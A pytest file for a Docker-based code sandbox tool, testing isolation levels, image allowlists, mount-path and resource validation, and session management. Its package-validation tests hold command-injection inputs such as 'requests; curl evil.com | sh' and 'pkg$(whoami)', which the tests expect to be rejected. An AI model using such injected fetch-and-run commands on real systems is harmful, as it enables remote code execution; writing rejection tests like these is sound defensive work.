"""Tests for mcp_proxy.tools.sandbox module."""

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from mcp_proxy.tools import sandbox
from mcp_proxy.tools.sandbox import (
    DEFAULT_IMAGES,
    ISOLATION_CONFIGS,
    _active_sessions,
    _build_docker_command,
    _parse_memory_limit,
    _validate_image,
    _validate_mount_path,
    _validate_packages,
    _validate_resource_limits,
    run_code_sandbox,
    sandbox_session_exec,
    sandbox_session_list,
    sandbox_session_start,
    sandbox_session_stop,
)


class TestIsolationConfigs:
    """Tests for isolation configuration constants."""

    def test_default_images_has_expected_languages(self):
        """DEFAULT_IMAGES has python, node, bash."""
        assert "python" in DEFAULT_IMAGES
        assert "node" in DEFAULT_IMAGES
        assert "bash" in DEFAULT_IMAGES

    def test_isolation_configs_has_expected_levels(self):
        """ISOLATION_CONFIGS has minimal, standard, secure."""
        assert "minimal" in ISOLATION_CONFIGS
        assert "standard" in ISOLATION_CONFIGS
        assert "secure" in ISOLATION_CONFIGS

    def test_minimal_isolation_has_network(self):
        """Minimal isolation allows network access."""
        assert ISOLATION_CONFIGS["minimal"]["network"] is True

    def test_standard_isolation_no_network(self):
        """Standard isolation disables network."""
        assert ISOLATION_CONFIGS["standard"]["network"] is False
        assert ISOLATION_CONFIGS["standard"]["read_only"] is True

    def test_secure_isolation_all_hardening(self):
        """Secure isolation has all hardening options."""
        assert ISOLATION_CONFIGS["secure"]["network"] is False
        assert ISOLATION_CONFIGS["secure"]["read_only"] is True
        assert ISOLATION_CONFIGS["secure"]["no_new_privileges"] is True
        assert ISOLATION_CONFIGS["secure"]["cap_drop_all"] is True


class TestSecurityValidation:
    """Tests for security validation functions."""

    def test_validate_image_allows_default(self):
        """Default images are allowed."""
        valid, result = _validate_image(None, "python")
        assert valid is True
        assert result == "python:3.12-alpine"

    def test_validate_image_allows_allowlisted(self):
        """Allowlisted images are allowed."""
        valid, result = _validate_image("python:3.11-alpine", "python")
        assert valid is True
        assert result == "python:3.11-alpine"

    def test_validate_image_rejects_unknown(self):
        """Unknown images are rejected."""
        valid, result = _validate_image("evil:latest", "python")
        assert valid is False
        assert "not in the allowlist" in result

    def test_validate_packages_allows_valid(self):
        """Valid package names are allowed."""
        valid, error = _validate_packages(["requests", "pandas>=2.0", "pkg[extra]"])
        assert valid is True
        assert error == ""

    def test_validate_packages_rejects_injection(self):
        """Command injection attempts are rejected."""
        valid, error = _validate_packages(["requests; curl evil.com | sh"])
        assert valid is False
        assert "Invalid package names" in error

    def test_validate_packages_rejects_shell_chars(self):
        """Shell metacharacters are rejected."""
        valid, error = _validate_packages(["pkg$(whoami)"])
        assert valid is False

    def test_validate_packages_allows_none(self):
        """None packages is valid."""
        valid, error = _validate_packages(None)
        assert valid is True

    def test_validate_mount_path_disabled_by_default(self):
        """Mount paths are disabled when ALLOWED_MOUNT_PATHS is empty."""
        # Save original and clear
        original = sandbox.ALLOWED_MOUNT_PATHS.copy()
        sandbox.ALLOWED_MOUNT_PATHS.clear()
        try:
            valid, error = _validate_mount_path("/some/path", "input_dir")
            assert valid is False
            assert "mounting is disabled" in error
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.update(original)

    def test_validate_mount_path_allows_configured(self, tmp_path: Path):
        """Configured mount paths are allowed."""
        sandbox.ALLOWED_MOUNT_PATHS.add(str(tmp_path))
        try:
            subdir = tmp_path / "subdir"
            valid, error = _validate_mount_path(str(subdir), "input_dir")
            assert valid is True
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.discard(str(tmp_path))

    def test_validate_mount_path_rejects_outside(self, tmp_path: Path):
        """Paths outside allowed directories are rejected."""
        sandbox.ALLOWED_MOUNT_PATHS.add(str(tmp_path))
        try:
            valid, error = _validate_mount_path("/etc/passwd", "input_dir")
            assert valid is False
            assert "not under allowed paths" in error
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.discard(str(tmp_path))

    def test_validate_mount_path_none_is_valid(self):
        """None path is always valid."""
        valid, error = _validate_mount_path(None, "input_dir")
        assert valid is True

    def test_parse_memory_limit_megabytes(self):
        """Memory limit in MB is parsed correctly."""
        valid, value = _parse_memory_limit("256m")
        assert valid is True
        assert value == 256

    def test_parse_memory_limit_gigabytes(self):
        """Memory limit in GB is converted to MB."""
        valid, value = _parse_memory_limit("1g")
        assert valid is True
        assert value == 1024

    def test_parse_memory_limit_invalid(self):
        """Invalid format returns False."""
        valid, value = _parse_memory_limit("invalid")
        assert valid is False

    def test_validate_resource_limits_caps_values(self):
        """Resource limits are capped to maximums."""
        valid, error, mem, cpu, timeout = _validate_resource_limits("10g", 100.0, 99999)
        assert valid is True
        assert mem == "1024m"  # Capped to MAX_MEMORY_MB
        assert cpu == 2.0  # Capped to MAX_CPU
        assert timeout == 300  # Capped to MAX_TIMEOUT_SECONDS

    def test_validate_resource_limits_rejects_invalid_memory(self):
        """Invalid memory format is rejected."""
        valid, error, mem, cpu, timeout = _validate_resource_limits("invalid", 1.0, 30)
        assert valid is False
        assert "Invalid memory limit format" in error


class TestBuildDockerCommand:
    """Tests for _build_docker_command helper function."""

    def test_basic_python_command(self, tmp_path: Path):
        """Basic Python command is built correctly."""
        cmd = _build_docker_command(
            code="print('hello')",
            language="python",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert cmd[0:3] == ["docker", "run", "--rm"]
        assert "--memory" in cmd
        assert "256m" in cmd
        assert "python:3.12-alpine" in cmd
        assert "python" in cmd
        assert "/code" in cmd

    def test_node_command(self, tmp_path: Path):
        """Node.js command uses correct image and interpreter."""
        cmd = _build_docker_command(
            code="console.log('hi')",
            language="node",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert "node:22-alpine" in cmd
        assert "node" in cmd[-2]

    def test_bash_command(self, tmp_path: Path):
        """Bash command uses alpine and sh."""
        cmd = _build_docker_command(
            code="echo hello",
            language="bash",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert "alpine:latest" in cmd
        assert "sh" in cmd[-2]

    def test_custom_image_overrides_default(self, tmp_path: Path):
        """Custom image parameter overrides language default."""
        cmd = _build_docker_command(
            code="print('hello')",
            language="python",
            image="my-custom-image:v1",
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert "my-custom-image:v1" in cmd
        assert "python:3.12-alpine" not in cmd

    def test_standard_isolation_adds_network_none(self, tmp_path: Path):
        """Standard isolation adds --network=none."""
        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="standard",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert "--network=none" in cmd
        assert "--read-only" in cmd

    def test_secure_isolation_adds_all_hardening(self, tmp_path: Path):
        """Secure isolation adds cap-drop and no-new-privileges."""
        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="secure",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert "--cap-drop" in cmd
        assert "ALL" in cmd
        assert "--security-opt" in cmd
        assert "no-new-privileges" in cmd

    def test_volume_mount_included(self, tmp_path: Path):
        """Code file is mounted as volume."""
        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert "-v" in cmd
        # Check volume mount format
        volume_idx = cmd.index("-v")
        volume_mount = cmd[volume_idx + 1]
        assert "/code:ro" in volume_mount

    def test_unknown_language_uses_sh(self, tmp_path: Path):
        """Unknown language defaults to sh interpreter."""
        cmd = _build_docker_command(
            code="echo hello",
            language="unknown",
            image="some-image",
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
        )

        assert cmd[-2] == "sh"
        assert cmd[-1] == "/code"


class TestRunCodeSandbox:
    """Tests for run_code_sandbox custom tool."""

    @pytest.mark.asyncio
    async def test_unsupported_language_returns_error(self):
        """Unsupported language without custom image returns error."""
        result = await run_code_sandbox(code="x", language="rust")

        assert result["success"] is False
        assert "Unsupported language" in result["error"]
        assert "rust" in result["error"]

    @pytest.mark.asyncio
    async def test_invalid_isolation_level_returns_error(self):
        """Invalid isolation level returns error."""
        result = await run_code_sandbox(code="x", isolation_level="paranoid")

        assert result["success"] is False
        assert "Invalid isolation_level" in result["error"]

    @pytest.mark.asyncio
    async def test_docker_not_available_returns_error(self):
        """Missing docker returns error."""
        with patch("mcp_proxy.tools.sandbox.shutil.which", return_value=None):
            result = await run_code_sandbox(code="print('hi')")

        assert result["success"] is False
        assert "Docker is not installed" in result["error"]

    @pytest.mark.asyncio
    async def test_successful_execution(self):
        """Successful execution returns stdout and success=True."""
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.communicate = AsyncMock(return_value=(b"hello\n", b""))

        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                return_value=mock_proc,
            ),
        ):
            result = await run_code_sandbox(code="print('hello')")

        assert result["success"] is True
        assert result["stdout"] == "hello\n"
        assert result["stderr"] == ""
        assert result["return_code"] == 0
        assert result["language"] == "python"
        assert result["isolation_level"] == "standard"

    @pytest.mark.asyncio
    async def test_failed_execution_returns_success_false(self):
        """Non-zero exit code returns success=False."""
        mock_proc = MagicMock()
        mock_proc.returncode = 1
        mock_proc.communicate = AsyncMock(return_value=(b"", b"error\n"))

        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                return_value=mock_proc,
            ),
        ):
            result = await run_code_sandbox(code="exit(1)")

        assert result["success"] is False
        assert result["stderr"] == "error\n"
        assert result["return_code"] == 1

    @pytest.mark.asyncio
    async def test_timeout_kills_process(self):
        """Timeout kills process and returns timed_out flag."""
        import asyncio

        mock_proc = MagicMock()
        mock_proc.returncode = -9
        mock_proc.kill = MagicMock()
        mock_proc.wait = AsyncMock()

        async def slow_communicate():
            await asyncio.sleep(10)
            return (b"", b"")

        mock_proc.communicate = slow_communicate

        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                return_value=mock_proc,
            ),
        ):
            result = await run_code_sandbox(code="while True: pass", timeout=1)

        assert result["success"] is False
        assert result["timed_out"] is True
        assert "timed out" in result["error"]
        mock_proc.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_exception_during_execution(self):
        """Exception during execution returns error."""
        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                side_effect=OSError("Docker daemon not running"),
            ),
        ):
            result = await run_code_sandbox(code="print('hi')")

        assert result["success"] is False
        assert "Docker daemon not running" in result["error"]

    @pytest.mark.asyncio
    async def test_custom_image_must_be_allowlisted(self):
        """Custom images must be in the allowlist."""
        with patch(
            "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
        ):
            result = await run_code_sandbox(
                code="fn main() {}",
                language="rust",
                image="rust:alpine",  # Not in allowlist
            )

        assert result["success"] is False
        assert "not in the allowlist" in result["error"]

    @pytest.mark.asyncio
    async def test_allowlisted_custom_image_works(self):
        """Allowlisted custom image works for unknown language."""
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.communicate = AsyncMock(return_value=(b"output", b""))

        # Use an allowlisted image
        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                return_value=mock_proc,
            ),
        ):
            result = await run_code_sandbox(
                code="echo hello",
                language="bash",
                image="ubuntu:22.04",  # This is allowlisted
            )

        assert result["success"] is True

    @pytest.mark.asyncio
    async def test_input_dir_blocked_when_not_configured(self):
        """Input directory is blocked when ALLOWED_MOUNT_PATHS is empty."""
        sandbox.ALLOWED_MOUNT_PATHS.clear()
        with patch(
            "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
        ):
            result = await run_code_sandbox(code="print('hi')", input_dir="/some/path")

        assert result["success"] is False
        assert "mounting is disabled" in result["error"]

    @pytest.mark.asyncio
    async def test_input_dir_not_exists_returns_error(self, tmp_path: Path):
        """Non-existent input directory returns error when mounts allowed."""
        sandbox.ALLOWED_MOUNT_PATHS.add(str(tmp_path))
        try:
            nonexistent = tmp_path / "nonexistent"
            with patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ):
                result = await run_code_sandbox(
                    code="print('hi')", input_dir=str(nonexistent)
                )

            assert result["success"] is False
            assert "Input directory does not exist" in result["error"]
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.discard(str(tmp_path))

    @pytest.mark.asyncio
    async def test_output_dir_created_if_not_exists(self, tmp_path: Path):
        """Output directory is created if it doesn't exist."""
        sandbox.ALLOWED_MOUNT_PATHS.add(str(tmp_path))
        try:
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.communicate = AsyncMock(return_value=(b"done", b""))

            output_dir = tmp_path / "new_output"
            assert not output_dir.exists()

            with (
                patch(
                    "mcp_proxy.tools.sandbox.shutil.which",
                    return_value="/usr/bin/docker",
                ),
                patch(
                    "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                    return_value=mock_proc,
                ),
            ):
                result = await run_code_sandbox(
                    code="print('hi')", output_dir=str(output_dir)
                )

            assert result["success"] is True
            assert output_dir.exists()
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.discard(str(tmp_path))

    @pytest.mark.asyncio
    async def test_output_files_listed_in_result(self, tmp_path: Path):
        """Output files are listed in result when output_dir is used."""
        sandbox.ALLOWED_MOUNT_PATHS.add(str(tmp_path))
        try:
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.communicate = AsyncMock(return_value=(b"done", b""))

            output_dir = tmp_path / "output"
            output_dir.mkdir()
            # Simulate files created by the sandbox
            (output_dir / "result.txt").write_text("test")
            (output_dir / "data.json").write_text("{}")

            with (
                patch(
                    "mcp_proxy.tools.sandbox.shutil.which",
                    return_value="/usr/bin/docker",
                ),
                patch(
                    "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                    return_value=mock_proc,
                ),
            ):
                result = await run_code_sandbox(
                    code="print('hi')", output_dir=str(output_dir)
                )

            assert result["success"] is True
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.discard(str(tmp_path))
        assert "output_files" in result
        assert "result.txt" in result["output_files"]
        assert "data.json" in result["output_files"]


class TestBuildDockerCommandNewFeatures:
    """Tests for new features in _build_docker_command."""

    def test_input_dir_mounted_readonly(self, tmp_path: Path):
        """Input directory is mounted as read-only."""
        input_dir = tmp_path / "input"
        input_dir.mkdir()

        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
            input_dir=input_dir,
        )

        # Find the volume mount for input
        assert "-v" in cmd
        volume_mounts = [cmd[i + 1] for i, v in enumerate(cmd) if v == "-v"]
        input_mount = [m for m in volume_mounts if "/input:ro" in m]
        assert len(input_mount) == 1

    def test_output_dir_mounted_readwrite(self, tmp_path: Path):
        """Output directory is mounted as read-write."""
        output_dir = tmp_path / "output"
        output_dir.mkdir()

        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
            output_dir=output_dir,
        )

        volume_mounts = [cmd[i + 1] for i, v in enumerate(cmd) if v == "-v"]
        output_mount = [m for m in volume_mounts if "/output:rw" in m]
        assert len(output_mount) == 1

    def test_packages_enable_network(self, tmp_path: Path):
        """Packages parameter enables network even in standard isolation."""
        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="standard",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
            packages=["requests"],
        )

        # Network should NOT be disabled when packages are specified
        assert "--network=none" not in cmd

    def test_packages_uses_pip_for_python(self, tmp_path: Path):
        """Python packages use pip install."""
        cmd = _build_docker_command(
            code="x",
            language="python",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
            packages=["requests", "pandas"],
        )

        # Should use sh -c with pip install
        assert "sh" in cmd
        assert "-c" in cmd
        cmd_str = " ".join(cmd)
        assert "pip install" in cmd_str
        assert "requests" in cmd_str
        assert "pandas" in cmd_str

    def test_packages_uses_npm_for_node(self, tmp_path: Path):
        """Node packages use npm install."""
        cmd = _build_docker_command(
            code="x",
            language="node",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
            packages=["lodash"],
        )

        cmd_str = " ".join(cmd)
        assert "npm install" in cmd_str
        assert "lodash" in cmd_str

    def test_packages_with_other_language_uses_sh(self, tmp_path: Path):
        """Non-python/node with packages uses sh /code."""
        cmd = _build_docker_command(
            code="x",
            language="bash",
            image=None,
            isolation_level="minimal",
            timeout=30,
            memory_limit="256m",
            cpu_limit=1.0,
            workdir=tmp_path,
            packages=["some-pkg"],
        )

        # Should just use sh /code for bash
        assert cmd[-2:] == ["sh", "/code"]


class TestSandboxSessionStart:
    """Tests for sandbox_session_start."""

    @pytest.fixture(autouse=True)
    def clear_sessions(self):
        """Clear active sessions before and after each test."""
        _active_sessions.clear()
        yield
        _active_sessions.clear()

    @pytest.mark.asyncio
    async def test_docker_not_available_returns_error(self):
        """Missing docker returns error."""
        with patch("mcp_proxy.tools.sandbox.shutil.which", return_value=None):
            result = await sandbox_session_start()

        assert result["success"] is False
        assert "Docker is not installed" in result["error"]

    @pytest.mark.asyncio
    async def test_unsupported_language_returns_error(self):
        """Unsupported language without custom image returns error."""
        with patch(
            "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
        ):
            result = await sandbox_session_start(language="rust")

        assert result["success"] is False
        assert "Unsupported language" in result["error"]

    @pytest.mark.asyncio
    async def test_successful_session_start(self):
        """Successful session start returns session_id."""
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.communicate = AsyncMock(return_value=(b"abc123def456\n", b""))

        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                return_value=mock_proc,
            ),
        ):
            result = await sandbox_session_start()

        assert result["success"] is True
        assert "session_id" in result
        assert "container_id" in result
        assert result["language"] == "python"

    @pytest.mark.asyncio
    async def test_session_start_failure(self):
        """Failed container start returns error."""
        mock_proc = MagicMock()
        mock_proc.returncode = 1
        mock_proc.communicate = AsyncMock(return_value=(b"", b"error message"))

        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                return_value=mock_proc,
            ),
        ):
            result = await sandbox_session_start()

        assert result["success"] is False
        assert "Failed to start container" in result["error"]

    @pytest.mark.asyncio
    async def test_session_start_with_working_dir(self, tmp_path: Path):
        """Working directory is mounted when in allowed paths."""
        sandbox.ALLOWED_MOUNT_PATHS.add(str(tmp_path))
        try:
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.communicate = AsyncMock(return_value=(b"abc123\n", b""))

            captured_cmd = []

            async def capture_exec(*args, **kwargs):
                captured_cmd.extend(args)
                return mock_proc

            with (
                patch(
                    "mcp_proxy.tools.sandbox.shutil.which",
                    return_value="/usr/bin/docker",
                ),
                patch(
                    "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                    side_effect=capture_exec,
                ),
            ):
                result = await sandbox_session_start(working_dir=str(tmp_path))

            assert result["success"] is True
            cmd_str = " ".join(captured_cmd)
            assert "/workspace" in cmd_str
        finally:
            sandbox.ALLOWED_MOUNT_PATHS.discard(str(tmp_path))

    @pytest.mark.asyncio
    async def test_session_start_working_dir_blocked_when_not_allowed(
        self, tmp_path: Path
    ):
        """Working directory is blocked when not in allowed paths."""
        sandbox.ALLOWED_MOUNT_PATHS.clear()
        result = await sandbox_session_start(working_dir=str(tmp_path))

        assert result["success"] is False
        assert "mounting is disabled" in result["error"]

    @pytest.mark.asyncio
    async def test_session_start_with_packages(self):
        """Packages are installed after container start."""
        start_proc = MagicMock()
        start_proc.returncode = 0
        start_proc.communicate = AsyncMock(return_value=(b"abc123\n", b""))

        install_proc = MagicMock()
        install_proc.returncode = 0
        install_proc.communicate = AsyncMock(return_value=(b"", b""))

        call_count = [0]

        async def multi_proc(*args, **kwargs):
            call_count[0] += 1
            if call_count[0] == 1:
                return start_proc
            return install_proc

        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                side_effect=multi_proc,
            ),
        ):
            result = await sandbox_session_start(packages=["requests"])

        assert result["success"] is True
        assert result["packages_installed"] == ["requests"]

    @pytest.mark.asyncio
    async def test_session_start_exception(self):
        """Exception during start returns error."""
        with (
            patch(
                "mcp_proxy.tools.sandbox.shutil.which", return_value="/usr/bin/docker"
            ),
            patch(
                "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
                side_effect=OSError("Docker error"),
            ),
        ):
            result = await sandbox_session_start()

        assert result["success"] is False
        assert "Docker error" in result["error"]


class TestSandboxSessionExec:
    """Tests for sandbox_session_exec."""

    @pytest.fixture(autouse=True)
    def clear_sessions(self):
        """Clear active sessions before and after each test."""
        _active_sessions.clear()
        yield
        _active_sessions.clear()

    @pytest.mark.asyncio
    async def test_session_not_found(self):
        """Non-existent session returns error."""
        result = await sandbox_session_exec(
            session_id="nonexistent", code="print('hi')"
        )

        assert result["success"] is False
        assert "Session not found" in result["error"]

    @pytest.mark.asyncio
    async def test_successful_execution(self, tmp_path: Path):
        """Successful code execution in session."""
        _active_sessions["test123"] = "sandbox-test123"

        copy_proc = MagicMock()
        copy_proc.returncode = 0
        copy_proc.communicate = AsyncMock(return_value=(b"", b""))

        exec_proc = MagicMock()
        exec_proc.returncode = 0
        exec_proc.communicate = AsyncMock(return_value=(b"hello\n", b""))

        call_count = [0]

        async def multi_proc(*args, **kwargs):
            call_count[0] += 1
            if call_count[0] == 1:
                return copy_proc
            return exec_proc

        with patch(
            "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
            side_effect=multi_proc,
        ):
            result = await sandbox_session_exec(
                session_id="test123", code="print('hello')"
            )

        assert result["success"] is True
        assert result["stdout"] == "hello\n"
        assert result["session_id"] == "test123"

    @pytest.mark.asyncio
    async def test_execution_timeout(self):
        """Timeout during execution returns error."""
        import asyncio

        _active_sessions["test123"] = "sandbox-test123"

        copy_proc = MagicMock()
        copy_proc.returncode = 0
        copy_proc.communicate = AsyncMock(return_value=(b"", b""))

        exec_proc = MagicMock()

        async def slow_communicate():
            await asyncio.sleep(10)
            return (b"", b"")

        exec_proc.communicate = slow_communicate

        call_count = [0]

        async def multi_proc(*args, **kwargs):
            call_count[0] += 1
            if call_count[0] == 1:
                return copy_proc
            return exec_proc

        with patch(
            "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
            side_effect=multi_proc,
        ):
            result = await sandbox_session_exec(
                session_id="test123", code="while True: pass", timeout=1
            )

        assert result["success"] is False
        assert result["timed_out"] is True


class TestSandboxSessionStop:
    """Tests for sandbox_session_stop."""

    @pytest.fixture(autouse=True)
    def clear_sessions(self):
        """Clear active sessions before and after each test."""
        _active_sessions.clear()
        yield
        _active_sessions.clear()

    @pytest.mark.asyncio
    async def test_session_not_found(self):
        """Non-existent session returns error."""
        result = await sandbox_session_stop(session_id="nonexistent")

        assert result["success"] is False
        assert "Session not found" in result["error"]

    @pytest.mark.asyncio
    async def test_successful_stop(self):
        """Successful session stop removes container."""
        _active_sessions["test123"] = "sandbox-test123"

        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.communicate = AsyncMock(return_value=(b"", b""))

        with patch(
            "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
            return_value=mock_proc,
        ):
            result = await sandbox_session_stop(session_id="test123")

        assert result["success"] is True
        assert "test123" not in _active_sessions

    @pytest.mark.asyncio
    async def test_stop_exception(self):
        """Exception during stop returns error."""
        _active_sessions["test123"] = "sandbox-test123"

        with patch(
            "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
            side_effect=OSError("Docker error"),
        ):
            result = await sandbox_session_stop(session_id="test123")

        assert result["success"] is False
        assert "Docker error" in result["error"]


class TestSandboxSessionList:
    """Tests for sandbox_session_list."""

    @pytest.fixture(autouse=True)
    def clear_sessions(self):
        """Clear active sessions before and after each test."""
        _active_sessions.clear()
        yield
        _active_sessions.clear()

    @pytest.mark.asyncio
    async def test_empty_list(self):
        """No active sessions returns empty list."""
        result = await sandbox_session_list()

        assert result["success"] is True
        assert result["sessions"] == []
        assert result["count"] == 0

    @pytest.mark.asyncio
    async def test_list_with_sessions(self):
        """Lists all active sessions with their status."""
        _active_sessions["sess1"] = "sandbox-sess1"
        _active_sessions["sess2"] = "sandbox-sess2"

        mock_proc = MagicMock()
        mock_proc.communicate = AsyncMock(return_value=(b"true\n", b""))

        with patch(
            "mcp_proxy.tools.sandbox.asyncio.create_subprocess_exec",
            return_value=mock_proc,
        ):
            result = await sandbox_session_list()

        assert result["success"] is True
        assert result["count"] == 2
        session_ids = [s["session_id"] for s in result["sessions"]]
        assert "sess1" in session_ids
        assert "sess2" in session_ids
